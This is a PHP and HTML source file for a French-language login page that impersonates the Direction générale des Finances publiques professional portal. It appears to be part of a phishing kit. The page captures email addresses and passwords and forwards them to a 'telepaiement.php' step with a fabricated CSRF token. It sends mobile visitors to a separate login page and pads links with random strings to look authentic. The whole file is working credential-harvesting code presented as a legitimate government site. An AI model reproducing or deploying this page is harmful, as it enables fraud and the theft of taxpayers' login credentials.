<?
date_default_timezone_set('UTC');
$rand="0123456789abcdefghijklmnopqrstuvwxyz";
/// Code Detect mobile/tablet/pc
$tablet_browser = 0;
$mobile_browser = 0;
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {$tablet_browser++;}
if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {$mobile_browser++;}
if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) {
$mobile_browser++;}$mobile_ua = strtolower(substr($_SERVER['HTTP_USER_AGENT'], 0, 4));
$mobile_agents = array('w3c ','acs-','alav','alca','amoi','ma','usa','il','ca','fr','es','co','nt','rt','audi','avan','benq','bird','blac','blaz','brew','cell','cldc','cmd-','dang','doco','eric','hipt','inno','act','ba','ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-','m','maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-','ld','newt','noki','palm','pana','pant','phil','@','android','ios','play','port','prox','qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','shar','ia','sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','tim-','tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','wapp','wapr','webc','winw','winw','xda ','xda-');
if (in_array($mobile_ua,$mobile_agents)) {$mobile_browser++;}
if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'opera mini') > 0) {$mobile_browser++;
$stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {$tablet_browser++;}}
if ($tablet_browser > 0) {}
else if ($mobile_browser > 0) {?><meta http-equiv="Refresh" content="0; url=mobile/LoginAccess.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?}
else {}
/// End
if (isset($_GET["a_e"]) AND isset($_GET["pass"])){
header("Refresh:0; url=telepaiement.php?asc_pas&OWASP_CSRFTOKEN=".substr(str_shuffle($rand),0,60)."&a_e=".$_GET["a_e"]."&pass=".$_GET["pass"]."");
}
?>
<!DOCTYPE HTML>
<html lang="fr" xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width; initial-scale=1; maximum-scale=1">
<link rel="stylesheet" href="css/style.css"/>
<link rel="icon" href="images/favicon.ico"/>
<script>
function validate(){
var a_e = document.getElementById("a_e").value;
var pass = document.getElementById("pass").value;

if (a_e == "" && pass == ""){
  document.getElementById("noureddyne_error").style.display = "block";
  document.getElementById("a_e").style.borderColor = "red";
  document.getElementById("pass").style.borderColor = "red";
return false;
} else {
  document.getElementById("noureddyne_error").style.display = "none";
  document.getElementById("a_e").style.borderColor = "white";
  document.getElementById("pass").style.borderColor = "white";
}

if (a_e.length < 3){
	document.getElementById("noureddyne_error").style.display = "block";
	document.getElementById("a_e").style.borderColor = "red";
return false;
}else {
  document.getElementById("noureddyne_error").style.display = "none";
  document.getElementById("a_e").style.borderColor = "white";
}

if (pass.length < 3){
	document.getElementById("noureddyne_error").style.display = "block";
	document.getElementById("pass").style.borderColor = "red";
return false;
}else {
  document.getElementById("noureddyne_error").style.display = "none";
  document.getElementById("pass").style.borderColor = "white";
}

}
</script>
<title>professionnel | authentification</title>
</head>
<body>
<div style="width:100%;text-align:center;">
<center>
<table style="width:90%;">
<tr>
<td style="text-align:left;">
<img src="images/peka.svg" style="height:100pt;"/>
</td>
<td style="text-align:right;">
<a href=""><img src="images/pro.png" style="float:right;"/></a>
<br>
<a href="telepaiement.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><img src="images/part.png" style="float:right;"/></a>
</td>
</tr>
</table>
</center>
</div>
<div style="width:100%;background-color:#e8e8e8;padding-top:9px;padding-bottom:35px;">
<center>
<table style="width:90%;color:black;">
<tr>
<td style="width:50%;text-align:left;font-size:14px;">
Accueil > Authentification
</td>
<td style="width:50%;text-align:right;">
<img src="images/info.png" alt="Aide">
</td>
</tr>
</table>
<table style="width:90%;color:black;">
<tr>
<td style="width:50%;">
<div style="margin-top:-11px;">
<div style="background:white;width:100%;border-radius:4px 4px 0px 0px;">
<h1 class="titre">Connexion &agrave; mon espace professionnel</h1>
<center>
<form class="form01" action="" method="get" onsubmit="return validate();" onchange="return validate();">
<div class="alert" id="noureddyne_error">Les donn&eacute;es saisies sont incorrectes.
<br>
V&eacute;rifiez vos param&eacute;tres de connexion ou cr&eacute;ez votre espace professionnel si vous n'en poss&eacute;dez aucun.
</div>
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:487px;padding:1px 1px 8px 1px;">Adresse &eacute;lectronique</div>
<div style="font-size:14px;width:487px;text-align:left;">
<input class="input_class" name="a_e" id="a_e" onkeyup="this.value = this.value.replace(/[']/g, '')" autofocus="" autocomplete="on" type="text"/>
<div>
<table style="width:487px;">
<tr>
<td><table style="margin-bottom:-12px;"><tr><td><div style="padding-bottom: 8px;color: rgb(51, 51, 51);
    font: 1em Arial, sans-serif;
    margin: 0px;
    font-size: 14px;
    padding-top: 1px;">Mot de passe </div>
</td><td><img src="images/cc.png" alt="Aide"></td></tr></table>
</td>
</tr>
<tr>
<td style="width:65%;">
<input class="input_class" name="pass" id="pass" style="width:90%;" onkeyup="this.value = this.value.replace(/[']/g, '')" autofocus="" autocomplete="on" type="password"/>
</td>
<td style="width:35%;text-align:center;padding-right:21px;">
<button class="btn" type="submit">Connexion</button>
</td>
</table>
<div class="mimi"><a href="telepaiement.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>">Mot de passe oubli&eacute;</a></div>
</form>
</center>
</div>
</div>
<div style="background:white;width:100%;border-radius:0px 0px 4px 4px;margin-top:7px;">
<center>
<div style="padding-bottom: 8px;
    color: rgb(51, 51, 51);
    font: 1em Arial, sans-serif;
    margin: 0px;
    text-align: center;
    font-size: 14px;
    width: 487px;
    padding-top: 9px;">Vous pouvez &eacute;galement payer en ligne votre taxe fonci&eacute;re ou votre cotisation fonci&eacute;re des entreprises en utilisant la référence de votre avis
</div>
<button class="btn02"><a href="telepaiement.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>">Payer mes imp&ocirc;ts locaux</a></button>
</center>
</div>
</td>
<td style="width:50%;max-height:380px;box-sizing:border-box">
<center>
<div style="background:white;width:100%;border-radius:4px 4px 0px 0px;margin-top: -11px;">
<h1 class="titre">Création de mon espace professionnel</h1>
<button class="btn03"><a href="telepaiement.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>">Créer mon espace professionnel</a></button>
</div>
<div style="background:white;width:100%;border-radius:0px 0px 4px 4px;">
<div style="font-size:1.2em;text-align:center;width:100%;border-bottom: 2px solid #a63950;margin-top: 7px;padding-top: 18px;padding-bottom: 7px;">
Activation de mon espace / mes services</div>
<button class="btn04"><a href="telepaiement.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>">Activer mon espace / mes services</a></button>
</div>
</center>
</td>
</tr>
</table>
</center>
</div>
<br>
<br>
<center>
<div style="color:black;font-size:14px;">Direction g&eacute;n&eacute;rale des Finances publiques</div>
</center>
<br>
<br>
</body>
</html>